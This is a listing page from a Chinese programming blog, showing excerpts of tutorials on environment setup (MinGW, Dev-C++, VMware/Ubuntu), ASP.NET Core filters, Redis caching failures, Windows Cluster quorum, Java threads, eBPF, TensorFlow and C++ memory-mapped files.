<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c641b84b73807d23fa47eefcc2971136/" rel="bookmark">
			C语言和dev c&#43;&#43;的环境部署和使用教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 电脑环境：Windows10 x64
一，软件的下载 1.MinGw的下载 下载地址：
选择适合你电脑的版本，点击下载，等待五秒。
然后将该压缩包放进去你需要的安装目录
二，环境变量的部署 1.打开电脑的高级系统设置 找到环境变量
2.添加环境变量 将/bin 文件路径添加到系统环境变量path里面
3.验证环境是否安装正常 使用win+r，输入cmd打开命令行窗口，在窗口输入命令gcc -v，出现以下内容显示配置成功
三，dev c++的下载 1.软件的下载： 官网下载地址https://sourceforge.net/projects/orwelldevcpp/或者
百度网盘下载https://pan.baidu.com/s/1H50KSGKssj9vKccNd6DlIg 提取码，8888。
2.安装步骤 直接安装软件
然后点开软件
然后按照提示进去就ok了
最后，祝大家学业有成，事业顺利。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cdd3f03e416dd82c1b90540de204861b/" rel="bookmark">
			【推荐】Win11&#43;VMware 17 Pro&#43;Ubuntu 20.04安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		鉴于工作需要，在Linux环境下调试代码，考虑到电脑空间有限而没有安装Win/Linux双系统，为此选择在Win系统下安装VMware（虚拟机）。然而，本人在点击“开启此虚拟机”时，电脑瞬间蓝屏并重启，现对网上众多资源进行总结归纳。本人建议“Win11+VMware Pro 17+Ubuntu 20.04”组合方案，现已成功上岸！
VMware Workstation 17 Pro 1. VMware官网下载地址：Download VMware Workstation Pro
或网盘分享：https://pan.baidu.com/s/1ZKKU9kuqpsoXEi1RT9e_4Q 提取码：vm17
2. 以管理员模式运行VMware*.exe文件，点击下一步即可
3. 鉴于本机已安装，后续步骤不以图片展示，主要为“接受许可协议中的条款”、"自定义安装地址（因软件所占空间较大，建议将其切换至D盘或其它非系统盘），并将VMware控制台工具添加至系统PATH"、"无需勾选用户体验设置所给选项"、“根据个人需要选择是否在桌面创建快捷方式”，然后点击“下一步”即可完成VMware的安装。为后续正常且稳定使用该软件，需输入相关密钥，可参考该博文。
在本地创建虚拟机 4. 鉴于网上诸多教程均涉及到“Windows功能”，本机配置项如下。
5. 用户点击"创建新的虚拟机"，主界面如图所示。
6. 后续用户按照“新建虚拟机向导”逐步完成安装操作，期间主要步骤如下：“选用典型（推荐）”、“稍后安装操作系统”、“客户机操作系统选择Linux，版本选择Ubuntu”、“用户根据个人需求选择虚拟机名称，位置选择在某盘（最好单独分盘，避免存在格式化的风险）”、“根据需求分配最大磁盘大小，并将虚拟磁盘拆分成多个文件”、“点击完成即可创建虚拟机（后续仍可自定义硬件类型）”。效果如下图所示。
7. 通过点击“编辑虚拟机设置”来修改本地虚拟机的配置，用户根据自身需求设置“内存、处理器、硬盘”等设置，网络适配器设置为NAT。当前仅完成虚拟机的创建，后续步骤为Ubuntu的部署。
ISO文件加载 8. 用户首先下载对应版本的ISO映像文件：链接地址。然后将ISO文件加载进去，即可完成对Ubuntu系统的部署。
Ubuntu20.04体验 9. 漫长的安装流程......
10. 用户点击头像并输入密码即可进入Ubuntu。
VMware Tools安装 11. 在桌面右键（或Ctrl+Alt+T）新建终端，输入以下指令
（1）sudo apt-get autoremove open-vm-tools //卸载已有的工具
（2）sudo apt-get install open-vm-tools //安装工具open-vm-tools
（3）sudo apt-get install open-vm-tools-desktop //安装open-vm-tools-desktop
（4）reboot //重启系统
用户通过上述操作即可实现，Ubuntu全屏及其与Windows实现复制内容共享，以提升用户体验。需要注意的是：输入sudo+指令后，界面提示用户输入密码，但密码并不显示，最后按Enter即可。
12. Enjoy！
补充 Linux解/压缩常用命令
如何实现Ubuntu与Windows之间的复制和粘贴？
Ubuntu安装VMware Tools提示"没有足够的空间去提取"
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd7348b8c570e89a62627e75d734e3db/" rel="bookmark">
			ASP.NET Core 中的五中过滤器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、AOP了解 AOP全称Aspect Oriented Programming意为面向切面编程，也叫做面向方法编程，是通过预编译方式和运行期动态代理的方式实现不修改源代码的情况下给程序动态统一添加功能的技术。
利用AOP可以对业务逻辑各个部分进行隔离，从而使业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高开发效率。
AOP的使用场景主要包括日志记录、性能统计、安全控制、事务处理、异常处理等。
2、Filter-过滤器概念 ASP.NET Core 有以下五种Filter 可以使用：
Authorization Filter：
Authorization是五种Filter中优先级最高的，通常用于验证Request合不合法，不合法后面就直接跳过。Resource Filter：Resource是第二优先，会在Authorization之后，Model Binding之前执行。通常会是需要对Model加工处理才用。Exception Filter：异常处理的Filter。Action Filter：最常使用的Filter，封包进出都会经过它，使用上没什么需要特别注意的。跟Resource Filter很类似，但并不会经过Model Binding。Result Filter：当Action完成后，最终会经过的Filter。 3、Filter使用场景 3.1 Authonization Filter权限控制过滤器 通过 Authonization Filter 可以实现复杂的权限角色认证、登陆授权等操作
public class AuthonizationFilter :Attribute,IAuthorizationFilter { public void OnAuthorization(AuthorizationFilterContext context) { //这里可以做复杂的权限控制操作 if (context.HttpContext.User.Identity.Name != "1") //简单的做一个示范 { //未通过验证则跳转到无权限提示页 RedirectToActionResult content = new RedirectToActionResult("NoAuth", "Exception", null); context.Result = content; } } } 3.2 Resource Filter资源过滤器 可以通过Resource Filter 进行资源缓存、防盗链等操作。使用Resource Filter 要求实现IResourceFilter 抽象接口
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd7348b8c570e89a62627e75d734e3db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f24b402ec5ab072860186ca827eeecf3/" rel="bookmark">
			Spring Boot中如何解决Redis的缓存穿透、缓存击穿、缓存雪崩？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redis的缓存穿透、缓存击穿、缓存雪崩 一、概述 ① 缓存穿透：大量请求根本不存在的key
② 缓存雪崩：Redis中大量key集体过期
③ 缓存击穿：Redis中一个热点key过期
三者出现的根本原因：Redis命中率下降，请求直接打在DB上 正常情况下，大量的资源请求都会被redis响应，在redis得不到响应的小部分请求才会去请求DB，这样DB的压力是非常小的，是可以正常工作的（如下图）
如果大量的请求在redis上得不到响应，那么就会导致这些请求会直接去访问DB，导致DB的压力瞬间变大而卡死或者宕机。如下图：
① 大量的高并发的请求打在redis上
② 这些请求发现redis上并没有需要请求的资源，redis命中率降低
③ 因此这些大量的高并发请求转向DB（数据库服务器）请求对应的资源
④ DB压力瞬间增大，直接将DB打垮，进而引发一系列“灾害”
那么为什么redis会没有需要访问的数据呢？通过分析大致可以总结为三种情况，也就对应着redis的雪崩、穿透和击穿（下文开始进行详解）
二、情景分析 （详解） （一）缓存击穿 概念： 产生缓存雪崩的原因：redis中的某个热点key过期，但是此时有大量的用户访问该过期key
情景： 缓存击穿的原因通常有以下几种：
缓存中不存在所需的热点数据：当系统中某个热点数据需要被频繁访问时，如果这个热点数据最开始没有被缓存，那么就会导致系统每次请求都需要直接查询数据库，造成数据库负担。
缓存的热点数据过期：当一个热点数据过期并需要重新缓存时，如果此时有大量请求，那么就会导致所有请求都要直接查询数据库。
类似于“某男明星塌房事件”上了热搜，这时候大量的“粉丝”都在访问该热点事件，但是可能由于某种原因，redis的这个热点key过期了，那么这时候大量高并发对于该key的请求就得不到redis的响应，那么就会将请求直接打在DB服务器上，导致整个DB瘫痪。 解决方案： 1.设置永不过期（提前对热点数据进行设置） 类似于新闻、某博等软件都需要对热点数据进行预先设置在redis中
2.加锁排队 （方式一）双重检查锁： 只有一个请求A可以获取到互斥锁，其它请求在外排队，然后线程A到DB中将数据查询并返回到Redis，之后所有请求就可以从Redis中得到响应（这些请求有两种情况：一，已经进入排队的请求获得锁之后，可在第二重查询redis中获取数据；二，没有进入排队的请求【也就是没有通过 if(obj == null) 而进入争取锁的队列中的请求】，直接在外部的查询redis获取到数据）
（方式二）分布式锁： 不好之处： 高并发的情况下，影响性能。但大多数情况下访问是可以从外层就可以获取到缓存数据的了，而只有在偶尔的情况下会因为key突然过期，才会导致那个时间的请求进入锁机制，而且进入排队的，也有二重检查来减轻对数据库的压力。
3.监控数据，适时调整 监控哪些数据是热门数据，实时的调整key的过期时长 使用锁机制
（二）缓存雪崩 概念： 缓存雪崩产生的原因：redis中大量的key集体过期
举例：
当redis中的大量key集体过期，可以理解为redis中的大部分数据都被清空了（失效了），那么这时候如果有大量并发的请求来到，那么redis就无法进行有效的响应（命中率急剧下降），请求就都打到DB上了，到时DB直接崩溃 情景： 大量key集体过期
解决方法
1.加锁排队 + 将失效时间分散开2.使用多级缓存架构3.设置缓存标记 Redis服务宕机
解决方法：redis高可用（集群、哨兵模式） 机房断电
解决方法：提前做好灾备，做好多机房，一个机房挂掉了，马上切换到另外一个地方的机房 解决方式： 1.加锁排队 + 将失效时间分散开 通过使用自动生成随机数使得key的过期时间是随机的，防止集体过期
2.使用多级架构 使用nginx缓存+redis缓存+其他缓存，不同层使用不同（过期时间）的缓存，可靠性更强
3.设置缓存标记 记录缓存数据是否过期，如果过期会去跟新实际的key。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f24b402ec5ab072860186ca827eeecf3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0466de4fb13d90c33e29c9e9d4d28fd7/" rel="bookmark">
			Windows Cluster 投票权问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在日常运维中，如果你的 Windows Cluster 需要升级、重启、意外宕机、网络中断等，你知道该怎么操作才能保证集群的可用性吗？按什么样的顺序怎样关闭或启动集群节点吗？怎么快速恢复你的集群呢？
接下来，我们就以实践操作来解决这几个疑问。首先要知道，Windows Server 2012 R2 提供了动态仲裁功能，以保证集群（投票权）为奇数节点。现在，假设一个Windows Server 故障转移集群 (WSFC) 有三个节点A、B、C（A为当前主节点），我们根据不同的见证（即仲裁）类型做以下测试。
多数节点
关闭节点A，节点上的所有资源都故障转移到节点B，由于动态仲裁作用投票为0。(数字为投票权)
关闭节点B，节点上的所有资源都故障转移到节点C。
关闭节点C，所有节点都已关闭，集群即关闭，无人可访问。
此时，当我们启动节点A时，发现集群报错并未恢复。当我们继续启动节点B时，集群仍然报错并未恢复。两个节点都在尝试连接到节点 C，即使我们有两个节点（A 和 B）并且配置为 Node Majority，集群也没有恢复。最后我们启动节点 C，集群则恢复，集群 Paxos Tag 的Epoch则发生改变并记录下来（集群算法请看上一篇文章）。
为什么会发生这种情况呢？
当一个节点A关闭时，它在集群注册表中的投票变为 0。当一个节点去启动集群服务时，它会检查它的投票。如果为0，则只会加入一个Cluster。如果为1，则首先尝试加入一个Cluster，如果无法连接到该Cluster加入，则自己恢复Cluster。当然，如果节点C永远无法恢复，启动节点A或B集群服务时，使用 ForceQuorum (FQ)开关来强制恢复集群。恢复后，其他节点都可以不考虑顺序加入了。
net start clussvc /forcequorum 磁盘见证
与上面的测试一样，按顺序关闭节点A、B、C，由于动态仲裁的作用，集群会保留为奇数投票节点。结果如下图。
此时首先恢复节点B或C，集群都能正常恢复，因为磁盘仲裁存储有集群配置信息。你可以通过命令查看节点投票权 (Get-Cluster).WitnessDynamicWeight，因为它有投票权，所以集群恢复。虽然磁盘存储集群数据，但是节点A无投票权，所以无法恢复集群。
文件共享见证
与上面的测试一样，按顺序关闭节点A、B、C，由于动态仲裁的作用，集群会保留为奇数投票节点。结果如下图。
在之前的磁盘见证情况下，我们可以启动节点B、C并恢复集群，这是因为节点有投票权，并且磁盘存储着群集数据库副本。但文件共享见证不同，它不持有集群数据库的副本。当剩下C节点的时候，C节点的集群数据是最新的。即使B、C、文件共享见证都有投票权，但节点A和B都没有新集群数据，这是因为文件共享见证不存储集群数据。若启动了节点A和B，集群都是无法正常恢复的。正常恢复集群只能先启动节点C（或者直到启动到节点C）。当然，启动节点A或B时，也可以使用 ForceQuorum (FQ) 开关来强制恢复集群。若使用ForceQuorum启动集群，当节点C启动时，发现已有了集群，则加入到集群中。
当我们在集群中启动一个节点以恢复集群时，节点将比较它的 paxos 与见证磁盘上的 paxos。如果节点 paxos 早于在磁盘见证上的数据，则它将最新副本下载到节点并使用它。如果本地节点较晚，它会将集群数据上传到磁盘见证。所以，了解了这些启动问题，当集群出现意外的时候，你就可以知道如何处理以快速恢复了。这对于安装有 SQL Server 高可用的集群非常重要。
附加说明：Windows Server 2016 故障转移群集遵循相同的设计，同时也引入了云见证。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca4fb723141323f20f8719e2a5a391f4/" rel="bookmark">
			Windows Cluster 分布式算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在分布式系统中，都需要解决分布式一致性问题。那么，在Windows 集群中，使用了什么算法来保证集群的一致性呢——Paxos。Windows Server 故障转移集群 (WSFC) 使用 Paxos 算法在整个系统中同步更改。通过记录 Paxos Tag 值并保留历史记录，可以轻松监控节点之间的集群数据库同步。在分布式系统中，每个节点都存储提案数据。在Windows 集群中，节点和见证磁盘存储提案数据。
注意：文件共享见证并不存储集群数据（历史原因这就不得而知了）
在 Windows Server 集群中，集群数据库是存储集群配置的地方。这是一个名为 CLUSDB 的文件，其中包含一些辅助文件（CLUSDB.1.container、CLUSDB.2.container、CLUSDB.blf），你可以在 C:\Windows\Cluster (%systemroot%\Cluster) 中找到这些文件。
集群数据库也存在于一个注册表配置单元中，该配置单元在集群服务启动时会被加载。数据在 HKEY_LOCAL_MACHINE\cluster。
现在我们知道注册表存在于多个位置并在节点之间进行复制。这种复制对于一个健康的集群来说是至关重要的。你可以在名为 PaxosTag 的集群键下看到一个 DWORD 值（如上图）。这个就是版本号，它跟踪记录集群的任何更改，这对于节点和磁盘见证（如果存在）之间的集群数据库一致性很重要。如果你更改了集群配置，Paxos Tag的数值也将变化。
这是新版的 Paxos Tag 格式，也是使用冒号分隔为三段数据，例如 2021/01/13-07`59`06.363_28:2021/01/13-07`59`06.363_28:123416
每次更改集群配置时，内部同步过程都会向集群中的所有节点发送提案。这由一个序列号（Sequence Numbe）和一个提案号（ProposalNumber）组成。一旦提案者从大多数节点获得共识，它将选择一个值并将其广播给所有其他节点以提交该值。这是Paxos Tag算法的内部工作原理。
在Windows Server 2008 故障转移群集中，Paxos Tag由三个数字组成, 每个数字用冒号分隔开，例如 3:3:276。这三个数字表示NextEpochNumber、 LastUpdateEpoch Number和Sequence Number。该数字存储在注册表HKLM\Cluster 的PaxosTag中，在各个节点中应是保持相同的。
当集群形成时，Epoch 数值将改变（新版本为集群形成时间戳）。每次对集群配置进行更新时，都会更最后的改序列号值。集群中的同步过程向集群中的所有节点发送一个提案。该提案由一个序列号和一个提案号组成。集群节点检查其集群配置的本地副本，以查看它是否具有更新的序列号或更高的提案号。如果节点没有更高的数字，则节点将接受提案值并发送回提案节点。如果集群中的大多数节点都接受了同一个提案，那么集群将达成“共识”。
所以，只有当集群恢复正常、或使用/forcequorum 开关(/FQ)启动集群时，Paxos Tag 的Epoch会发生改变。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c34d19bc8a9ba910f6ab7c8edcc55f3b/" rel="bookmark">
			【Java多线程】【Java创建线程】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、线程程序 一个线程在Java中使用 Thread的类 实例来描述
Thread 类是Java语言中一个重要的类，位于 Java.lang包中；
通过继承Thread 类来创建线程；通过 start() 这个方法调用线程，系统会自动调用run()，t 线程就开始执行；
我们可以通过 jconsole.exe 这个文件帮我们查看java执行期间的线程
2、创建线程 2.1 方法1 继承Thread类 继承 Thread类 ，重写 run()方法创建 Thread实例，start()调用线程，自动调用run方法 class MyThread extends Thread{ @Override public void run() { while (true){ try { Thread.sleep(1000); //Thread 的静态方法 }catch (InterruptedException e) { e.printStackTrace(); } System.out.println("开辟线程 1"); } } } public static void main(String[] args) { //多态向上转型 创建线程 Thread thread = new MyThread(); //开始调用线程 只能调用一次 thread.start(); while (true){ try { Thread.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c34d19bc8a9ba910f6ab7c8edcc55f3b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09d1b2ea892d8823a6e4a9577b8e1c60/" rel="bookmark">
			keil的软件仿真的问题记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题1：
【1】keil--&gt;Debug--&gt;Start/Stop Debug Session
出现：
void SystemInit (void)
{
/* Reset the RCC clock configuration to the default reset state(for debug purpose) */
/* Set HSION bit */
RCC-&gt;CR |= 0x00000001U;
解决：
【1】keil--&gt;Project--&gt;Options for Target '...'--&gt;Degug
--&gt;(*)Use Simulator, (*)Limit Speed to Real-Time
--&gt;Dialog DLL:DARMSTM.DLL, Parameter:-pSTM32F103ZE
注意的是：我用的单片机是stm32f103ZET6，是stm32cube自动生成的工程。
所以上面后面两个字母是ZE
问题2：
【1】keil--&gt;Debug--&gt;Start/Stop Debug Session
出现问题：
运行到这里
/* Start scheduler */
osKernelStart();
跳到：
/* Set the msp back to the start of the stack.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/09d1b2ea892d8823a6e4a9577b8e1c60/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41576f4e1b767887432c16bd88b792e6/" rel="bookmark">
			【Java 多线程】【线程和进程的区别】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、线程是什么？
2、线程为什么存在
3、 进程和线程的联系（重点）
4、 线程和进程的区别（重点）
1、线程是什么？ 线程是指在进程内部运行的轻量级执行单元，是操作系统进行任务调度的基本单位
一个线程就是一个 "执行流". 一个进程可以包含多个线程，多个线程之间 "同时" 执行着多份代码.
这些线程共享进程的资源（如内存、文件句柄等），但每个线程有自己的栈空间和程序计数器。不同的线程可以并发执行，从而提高程序的运行效率。
2、线程为什么存在 进程的创建、销毁、调度 成本都很高，线程的出现比进程的创建、销毁、调度更快，成本也越低，这就是操作系统资源分配造成的
操作系统真正调度的是进程 而不是 线程
一个进程有多个线程；每个线程都是一个独立的执行流，多个线程之间是并发执行
原因：
1. 一个进程中的多个线程之间，公用一份系统资源
内存空间文件描述符表 2. 只有在进程启动，创建第一个线程的时候，需要花费成本去申请系统资源
一个进程（第一个线程）创建完毕，之后的线程创建就不必申请资源了，创建/销毁的效率就提高了 3、 进程和线程的联系（重点） 进程：是正在执行中程序的实例，具有自己的地址空间、代码段、数据段、堆栈和进程控制块等系统资源，是操作系统分配资源的基本单位，进程可以包含多个线程，它们共享进程的资源
线程：是进程内部的一条执行路径，是操作系统的系统资源调度的基本单位。一个进程可以包含多个线程，它们共享进程的空间和系统资源，但每个线程有自己的栈空间和程序计数器。线程之间可以并发执行，从而提高程序的运行效率； 进程和线程的关系：
进程可以包含多个线程，进程和线程之间是包含和被包含的关系；线程是在进程的内部运行的，共享进程的资源，线程之间可以通过共享内存等机制来交换信息的协调资源线程的创建、销毁和调度比进程快，因为线程共享进程资源，无需想进程一样重新创建和初始化进程之间不会影响，相互隔离，但是一个线程挂了，会影响同一进程中的线程，进而造成所属进程的崩溃； 4、 线程和进程的区别（重点） 进程：操作系统分配资源的基本单位
线程：操作系统调度运行的基本单位
区别
进程
线程
定义
运行中的程序实例，有自己的地址空间和系统资源
在进程内部运行的轻量级执行单元，共享进程的地址空间和系统资源
调度
操作系统分配资源的基本单位
操作系统调度运行的基本单位
并发性
进程是独立的执行实体，相互之间不会影响到彼此的运行
线程在同一进程中运行，共享进程的资源，如内存和文件句柄等
消耗
创建、终止、切换进程的开销较大，需要分配和释放资源
创建、终止、切换线程的开销较小，因为线程共享进程的资源
安全性
进程之间相互独立，一个进程崩溃不会影响其他进程
线程共享进程资源，线程崩溃会影响同一进程中的线程，进而造成所属进程的崩溃；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/667b7610a75edce0daa7f76dc92c5930/" rel="bookmark">
			list 分割成多个list
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		package mall.block.client.common.util; import mall.block.client.entity.entity.MallProducts; import java.util.ArrayList; import java.util.HashMap; import java.util.List; import java.util.Map; /** * 把集合拆分成多个集合 */ public class BatchListUtil { /** * 把list分成多个批次 * @param list 集合 * @param batchSize 批次大小 * @return Map&lt;Integer,List&lt;E&gt;&gt; */ public static List&lt;List&lt;MallProducts&gt;&gt; groupList(List&lt;MallProducts&gt; list,Integer count) { List&lt;List&lt;MallProducts&gt;&gt; listGroup = new ArrayList&lt;List&lt;MallProducts&gt;&gt;(); int listSize = list.size(); //子集合的长度 int toIndex = count; for (int i = 0; i &lt; list.size(); i += count) { if (i + count &gt; listSize) { toIndex = listSize - i; } List&lt;MallProducts&gt; newList = list.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/667b7610a75edce0daa7f76dc92c5930/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2dd9b51943841a79544563fd5659058/" rel="bookmark">
			libbpf-bootstrap开发指南：第一个tracepoint 监测demo - minimal
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
代码分析
BPF 程序部分
功能说明
头文件引入说明
SEC 关键字说明
bpf_get_current_pid_tgid() &gt;&gt; 32
用户程序部分
功能说明
头文件引入介绍
libbpf_set_print
minimal_bpf__open
skel-&gt;bss-&gt;my_pid = getpid();
minimal_bpf__load(skel);
minimal_bpf__attach(skel);
minimal_bpf__destroy(skel);
执行效果
这个样例也是最简单的样例，会监测write 系统调用，当用户程序调用 "sys_write" 系统调用时，输出一条内核日志，输出自己是哪一个进程trigger 的
代码分析 BPF 程序部分 #include &lt;linux/bpf.h&gt; #include &lt;bpf/bpf_helpers.h&gt; char LICENSE[] SEC("license") = "Dual BSD/GPL"; int my_pid = 0; SEC("tp/syscalls/sys_enter_write") int handle_tp(void *ctx) { int pid = bpf_get_current_pid_tgid() &gt;&gt; 32; if (pid != my_pid) return 0; bpf_printk("BPF triggered from PID %d.\n", pid); return 0; } 功能说明 在上述代码中，int pid = bpf_get_current_pid_tgid() &gt;&gt; 32; 将当前进程的 PID 存储在 pid 变量中，以便后续的处理。该代码位于 handle_tp 函数中，用于在 "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b2dd9b51943841a79544563fd5659058/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e73ca13cc3c026714c8f5d68f2f657bc/" rel="bookmark">
			libbpf-bootstrap 开发指南：概念与如何安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
概念
如何安装&amp; 使用
git 地址
使用git clone 下载代码
安装依赖环境
安装libbpf
编译example
概念 libbpf-bootstrap 是一个项目，旨在帮助开发者快速启动和开发使用 eBPF (Extended Berkeley Packet Filter) 和 libbpf 的程序。eBPF 是一种可以在 Linux 内核中运行的程序，提供了强大的网络过滤、系统调用监控和性能分析等功能。libbpf 是一个库，用于加载和管理 eBPF 程序和 map。
libbpf-bootstrap 提供了一些样例程序和模板，帮助开发者理解如何使用 libbpf 创建、加载、管理 eBPF 程序，并与这些程序进行交互。
以下是 libbpf-bootstrap 的一些主要特性：
样例程序：libbpf-bootstrap 提供了一些样例程序，用于演示如何使用 libbpf 和 eBPF。这些样例程序包括网络监控、性能分析等不同类型的 eBPF 程序。构建系统集成：libbpf-bootstrap 提供了集成到构建系统的模板，可以方便地编译和链接 eBPF 程序。BPF CO-RE (Compile Once - Run Everywhere) 支持：BPF CO-RE 是一种让 eBPF 程序能在不同版本的 Linux 内核上运行的技术。libbpf-bootstrap 支持 CO-RE，使得开发的 eBPF 程序可以在不同版本的 Linux 内核上运行，无需重新编译。用户空间和内核空间程序的交互：libbpf-bootstrap 展示了如何从用户空间程序发送数据到 eBPF 程序，以及从 eBPF 程序返回数据到用户空间。详细的文档：libbpf-bootstrap 提供了详细的文档，包括如何安装、如何使用样例程序，以及如何创建自己的 eBPF 程序等。 如何安装&amp; 使用 git 地址 https://github.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e73ca13cc3c026714c8f5d68f2f657bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2be26ba884e6692061a21d82d14d6cd3/" rel="bookmark">
			Inference with TensorFlow
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Implement Linear Regression &amp; Logistic Regression with TensorFlowLinear ActivationSigmoid Activation Implement Simple Neural Network Using TensorFlowPlot dataImplement NetworksEpochs and batchesLayer Functions Dense(input_shape)tf.TensorShape Implement Linear Regression &amp; Logistic Regression with TensorFlow 在前面我们讨论过，神经网络可以被视为许多个函数的嵌套集合，每个神经元（neuron）都包含一个特定的激活函数。这意味着，我们可以将简单的线性回归和对率回归模型，当作是只有一个神经元的神经网络。
Linear Activation 创建线性层，只需要设置activation为linear即可。
linear_layer = tf.keras.layers.Dense(units = 1, activation = 'linear'， ) 但需要注意的是，此时则权重模型权重还未初始化（没有build），需要使用build(input_shape)或者跑一轮数据确定input_shape，触发权重的初始化（trigger the instantiation of the weights）
build(self, input_shape)根据input_shape创建层的权重。input_shape是TensorShape类型的，后面单开一小节讨论下。
如果直接跑一轮数据的话，会调用call，如果该层之前没有build，则call方法会自动调用build，匹配inputs的shape。
&gt;&gt;&gt; X = np.array([[1, -3, 5], ... [2, 4, -6]]) &gt;&gt;&gt; linear_layer(X) &lt;tf.Tensor: shape=(2, 1), dtype=float32, numpy= array([[-2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2be26ba884e6692061a21d82d14d6cd3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ccb02aa2454f2c9459492e75d509dfbc/" rel="bookmark">
			c&#43;&#43;内存映射文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概念 将一个文件直接映射到进程的进程空间中（“映射”就是建立一种对应关系,这里指硬盘上文件的位置与进程逻辑地址空间中一块相同区域之间一 一对应,这种关系纯属是逻辑上的概念，物理上是不存在的），这样可以通过内存指针用读写内存的办法直接存取文件内容。 特点 文件数据可以用内存读/写指令来访问，而不是用Read和Write这样的I/O系统函数，从而提高了文件存取速度。 流程 打开文件，创建文件句柄；为文件创建内存映射内核对象，返回内存映射文件句柄；映射整个文件或一部分到进程的虚拟地址空间，返回文件映射到内存后的起始地址；解除文件映射；关闭内存映射文件句柄；关闭文件句柄； 函数 1）创建文件句柄。
windows # 函数 HANDLE CreateFile(LPCTSTR lpFileName, //普通文件名或者设备文件名 DWORD dwDesiredAccess, //访问模式（写/读） DWORD dwShareMode, //共享模式 LPSECURITY_ATTRIBUTES lpSecurityAttributes, //指向安全属性的指针 DWORD dwCreationDisposition, //如何创建 DWORD dwFlagsAndAttributes, //文件属性 HANDLE hTemplateFile //用于复制文件句柄 ); linux # 函数 int open(const char *pathname, int flags, mode_t mode); 2）创建内存映射内核对象。
